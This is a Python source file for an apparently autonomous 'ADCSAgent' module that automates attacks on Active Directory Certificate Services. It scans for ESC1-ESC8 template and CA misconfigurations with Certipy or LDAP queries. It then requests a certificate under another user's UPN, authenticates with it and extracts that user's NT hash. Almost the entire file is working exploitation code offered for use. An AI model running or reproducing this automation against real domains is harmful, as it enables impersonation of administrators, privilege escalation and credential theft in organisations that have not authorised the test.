"""
ADCS Agent - Active Directory Certificate Services Exploitation
Implements ESC1-ESC8 attacks using Certify and Certipy tools
"""

import asyncio
import subprocess
import logging
from typing import Dict, Any, List
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)


class ADCSAgent(BaseAgent):
    """
    ADCS exploitation agent for Active Directory Certificate Services attacks
    
    Supports:
    - ESC1: Misconfigured Certificate Templates
    - ESC2: Misconfigured Certificate Templates (Any Purpose)
    - ESC3: Enrollment Agent Templates
    - ESC4: Vulnerable Certificate Template Access Control
    - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
    - ESC7: Vulnerable Certificate Authority Access Control
    - ESC8: NTLM Relay to AD CS HTTP Endpoints
    """
    
    def __init__(self):
        super().__init__(
            name="ADCSAgent",
            description="Exploit AD Certificate Services vulnerabilities (ESC1-ESC8)",
            version="1.0.0"
        )
        self.timeout = 300  # 5 minutes for AD operations
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            strategy: {
                "action": "scan" or "exploit",
                "domain": "example.com",
                "username": "user",
                "password": "pass",
                "dc_ip": "10.0.0.1",
                "ca": "CA-NAME" (optional),
                "template": "User" (optional),
                "upn": "admin@example.com" (for exploitation)
            }
        """
        try:
            action = strategy.get("action", "scan")
            domain = strategy.get("domain")
            username = strategy.get("username")
            password = strategy.get("password")
            dc_ip = strategy.get("dc_ip")
            
            if not all([domain, username, password, dc_ip]):
                return AgentData(
                    success=False,
                    errors=["Missing required parameters: domain, username, password, dc_ip"]
                )
            
            if action == "scan":
                result = await self.scan_adcs(domain, username, password, dc_ip)
            elif action == "exploit":
                ca = strategy.get("ca")
                template = strategy.get("template")
                upn = strategy.get("upn")
                result = await self.exploit_adcs(
                    domain, username, password, dc_ip, ca, template, upn
                )
            else:
                return AgentData(
                    success=False,
                    errors=[f"Unknown action: {action}"]
                )
            
            return AgentData(
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[ADCSAgent] Error: {e}")
            return AgentData(success=False, errors=[str(e)])
    
    async def scan_adcs(self, domain: str, username: str, password: str, dc_ip: str) -> Dict:
        """
        Scan for ADCS vulnerabilities using Certipy
        
        Returns:
            Dict with vulnerable templates and CAs
        """
        log.info(f"[ADCS] Scanning {domain} for ADCS vulnerabilities...")
        
        # Use Certipy for comprehensive scanning
        cmd = [
            "certipy", "find",
            "-u", f"{username}@{domain}",
            "-p", password,
            "-dc-ip", dc_ip,
            "-vulnerable",
            "-stdout"
        ]
        
        try:
            result = await self._run_command(cmd)
            
            if result["exit_code"] == 0:
                output = result["stdout"]
                vulnerabilities = self._parse_certipy_output(output)
                
                return {
                    "success": True,
                    "vulnerabilities": vulnerabilities,
                    "raw_output": output
                }
            else:
                # Fallback: try manual enumeration
                log.warning("[ADCS] Certipy failed, trying manual enumeration...")
                return await self._manual_scan(domain, username, password, dc_ip)
        
        except FileNotFoundError:
            log.warning("[ADCS] Certipy not found. Install: pip3 install certipy-ad")
            return {
                "success": False,
                "error": "Certipy not installed",
                "install_command": "pip3 install certipy-ad"
            }
        except Exception as e:
            log.error(f"[ADCS] Scan error: {e}")
            return {"success": False, "error": str(e)}
    
    async def exploit_adcs(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        ca: str = None,
        template: str = None,
        upn: str = None
    ) -> Dict:
        """
        Exploit ADCS vulnerability to request certificate
        
        Args:
            ca: Certificate Authority name
            template: Vulnerable template name
            upn: User Principal Name to impersonate
        """
        log.info(f"[ADCS] Exploiting ADCS on {domain}...")
        
        if not all([ca, template]):
            return {
                "success": False,
                "error": "CA and template required for exploitation"
            }
        
        # ESC1: Request certificate with alternate UPN
        if upn:
            cmd = [
                "certipy", "req",
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-ca", ca,
                "-template", template,
                "-upn", upn
            ]
        else:
            cmd = [
                "certipy", "req",
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-ca", ca,
                "-template", template
            ]
        
        try:
            result = await self._run_command(cmd)
            
            if result["exit_code"] == 0:
                output = result["stdout"]
                
                # Extract certificate
                cert_file = self._extract_certificate_path(output)
                
                # Authenticate with certificate
                if cert_file:
                    auth_result = await self._authenticate_with_cert(
                        domain, dc_ip, cert_file
                    )
                    return {
                        "success": True,
                        "certificate": cert_file,
                        "authentication": auth_result,
                        "raw_output": output
                    }
                else:
                    return {
                        "success": True,
                        "raw_output": output,
                        "note": "Certificate requested but file path not found"
                    }
            else:
                return {
                    "success": False,
                    "error": result["stderr"],
                    "raw_output": result["stdout"]
                }
        
        except Exception as e:
            log.error(f"[ADCS] Exploitation error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _manual_scan(self, domain: str, username: str, password: str, dc_ip: str) -> Dict:
        """Manual ADCS enumeration using LDAP queries"""
        
        # Use ldapsearch or custom LDAP queries
        cmd = [
            "ldapsearch",
            "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{username}@{domain}",
            "-w", password,
            "-b", f"CN=Configuration,DC={domain.replace('.', ',DC=')}",
            "(objectClass=pKICertificateTemplate)"
        ]
        
        try:
            result = await self._run_command(cmd)
            
            if result["exit_code"] == 0:
                templates = self._parse_ldap_templates(result["stdout"])
                return {
                    "success": True,
                    "method": "manual_ldap",
                    "templates": templates
                }
            else:
                return {
                    "success": False,
                    "error": "Manual enumeration failed",
                    "note": "Install Certipy for better results: pip3 install certipy-ad"
                }
        except FileNotFoundError:
            return {
                "success": False,
                "error": "ldapsearch not found",
                "install_command": "apt-get install ldap-utils"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def _authenticate_with_cert(self, domain: str, dc_ip: str, cert_file: str) -> Dict:
        """Authenticate using certificate to get TGT"""
        
        cmd = [
            "certipy", "auth",
            "-pfx", cert_file,
            "-dc-ip", dc_ip
        ]
        
        try:
            result = await self._run_command(cmd)
            
            if result["exit_code"] == 0:
                # Extract NT hash or TGT
                output = result["stdout"]
                nt_hash = self._extract_nt_hash(output)
                
                return {
                    "success": True,
                    "nt_hash": nt_hash,
                    "raw_output": output
                }
            else:
                return {
                    "success": False,
                    "error": result["stderr"]
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _parse_certipy_output(self, output: str) -> List[Dict]:
        """Parse Certipy vulnerable output"""
        
        vulnerabilities = []
        
        # Look for ESC patterns
        esc_patterns = ["ESC1", "ESC2", "ESC3", "ESC4", "ESC6", "ESC7", "ESC8"]
        
        for esc in esc_patterns:
            if esc in output:
                vulnerabilities.append({
                    "type": esc,
                    "description": self._get_esc_description(esc)
                })
        
        return vulnerabilities
    
    def _get_esc_description(self, esc_type: str) -> str:
        """Get description for ESC vulnerability"""
        
        descriptions = {
            "ESC1": "Misconfigured Certificate Templates - allows SAN specification",
            "ESC2": "Misconfigured Certificate Templates - Any Purpose EKU",
            "ESC3": "Enrollment Agent Templates",
            "ESC4": "Vulnerable Certificate Template Access Control",
            "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled",
            "ESC7": "Vulnerable Certificate Authority Access Control",
            "ESC8": "NTLM Relay to AD CS HTTP Endpoints"
        }
        
        return descriptions.get(esc_type, "Unknown vulnerability")
    
    def _parse_ldap_templates(self, output: str) -> List[str]:
        """Parse LDAP output for certificate templates"""
        
        templates = []
        
        for line in output.split("\n"):
            if "cn:" in line.lower():
                template_name = line.split(":")[-1].strip()
                if template_name:
                    templates.append(template_name)
        
        return templates
    
    def _extract_certificate_path(self, output: str) -> str:
        """Extract certificate file path from output"""
        
        import re
        
        # Look for .pfx file
        match = re.search(r'([^\s]+\.pfx)', output)
        if match:
            return match.group(1)
        
        return None
    
    def _extract_nt_hash(self, output: str) -> str:
        """Extract NT hash from authentication output"""
        
        import re
        
        match = re.search(r'NT Hash:\s*([0-9a-fA-F]{32})', output)
        if match:
            return match.group(1)
        
        return None
    
    async def _run_command(self, cmd: List[str]) -> Dict:
        """Run command asynchronously"""
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.timeout
            )
            
            return {
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore')
            }
        
        except asyncio.TimeoutError:
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": "Command timed out"
            }
        except Exception as e:
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": str(e)
            }

